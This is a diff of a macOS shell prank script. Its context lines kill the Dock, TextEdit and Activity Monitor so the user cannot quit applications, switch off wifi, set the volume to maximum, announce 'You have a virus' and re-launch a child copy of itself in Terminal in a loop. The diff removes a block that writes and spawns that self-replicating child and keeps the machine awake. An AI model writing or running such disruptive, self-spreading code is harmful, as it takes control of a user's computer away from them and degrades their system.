@@ -7,8 +7,6 @@ killall Dock
 killall TextEdit
 #Kill Activity Monitor, so you can't quit applications
 killall "Activity Monitor"
-#kill terminal
-killall Terminal
 #Kill wifi, just for fun
 networksetup -setairportpower en1 off
 #Make an error sound
@@ -16,14 +14,6 @@ osascript -e 'beep'
 #Set the volume to max, then say "You have a virus"
 osascript -e "set volume 7"
 say You have a virus
-#Check if it's parent, and if it is, caffeinate computer
-if [ $1 = "1" ]; then
-  echo "#!/bin/bash" >> child
-  echo "nohup sh -c '$PWD/trollingnl'" >> child
-  chmod +x ./child
-  open -a Terminal.app ~/child
-  caffeinate
-fi
 #Self-replicate
 open -a Terminal.app ~/child
 done
